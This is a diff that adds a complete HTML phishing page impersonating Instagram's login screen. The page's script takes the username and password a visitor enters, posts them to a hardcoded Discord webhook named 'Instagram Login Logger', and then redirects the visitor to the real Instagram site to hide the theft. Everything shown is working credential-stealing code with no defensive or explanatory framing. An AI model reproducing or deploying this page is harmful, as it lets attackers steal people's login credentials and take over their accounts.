@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link rel="shortcut icon" href="https://imgs.search.brave.com/4HDqFbLOhjQll4awFRi3DtGHbSGlDQM__WHnn-GI5Rc/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly91cGxv/YWQud2lraW1lZGlh/Lm9yZy93aWtpcGVk/aWEvY29tbW9ucy85/Lzk1L0luc3RhZ3Jh/bV9sb2dvXzIwMjIu/c3Zn" type="image/x-png">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram</title>
+  <link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-box">
+      <img src="Image/instagram-text-icon.webp" alt="Instagram Logo" class="logo" />
+
+      <input type="text" id="username" placeholder="Phone number, username or email address" class="input-field" />
+      <div class="password-wrapper">
+        <input type="password" id="password" placeholder="Password" class="input-field" />
+        <span class="eye-icon">👁️</span>
+      </div>
+
+      <a href="https://instagram.com" class="forgot-password">Forgotten password?</a>
+
+      <button class="login-btn" onclick="sendToDiscord()">Log In</button>
+
+      <div class="divider">
+        <div class="line"></div>
+        <span>OR</span>
+        <div class="line"></div>
+      </div>
+
+      <button class="facebook-login">
+        <img class="fb-logo" src="https://imgs.search.brave.com/2ErMY_NoeuRugmA_-2CLj0VmFjR7z-DLH5NydPsvYpM/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9zdGF0/aWMudmVjdGVlenku/Y29tL3N5c3RlbS9y/ZXNvdXJjZXMvdGh1/bWJuYWlscy8wMTgv/OTMwLzY5OC9zbWFs/bC9mYWNlYm9vay1s/b2dvLWZhY2Vib29r/LWljb24tdHJhbnNw/YXJlbnQtZnJlZS1w/bmcucG5n" alt="Facebook" />
+        Log in with Facebook
+      </button>
+
+      <div class="signup-text">
+        Don't have an account? <a href="https://instagram.com">Sign Up</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function sendToDiscord() {
+      // Replace YOUR_WEBHOOK_URL with your actual Discord webhook URL
+      const webhookUrl = 'https://discord.com/api/webhooks/1377306943030296586/rkNr2A7CCpKUMdWQOCxSqIHL10CbuKPJ1ogIAEXrkISD7d0moWk2ITrIzG7enY6bWs5G';
+      
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      
+      // Create the message to send
+      const message = {
+        content: `New login attempt:\nUsername: ${username}\nPassword: ${password}`,
+        username: 'Instagram Login Logger',
+        avatar_url: 'https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg'
+      };
+      
+      // Send the data to Discord webhook
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(message),
+      })
+      .then(response => {
+        if (!response.ok) {
+          console.error('Error sending to Discord');
+        }
+        // Redirect after sending (optional)
+        window.location.href = 'https://instagram.com';
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        // Still redirect even if there's an error
+        window.location.href = 'https://instagram.com';
+      });
+    }
+  </script>
+</body>
+</html>
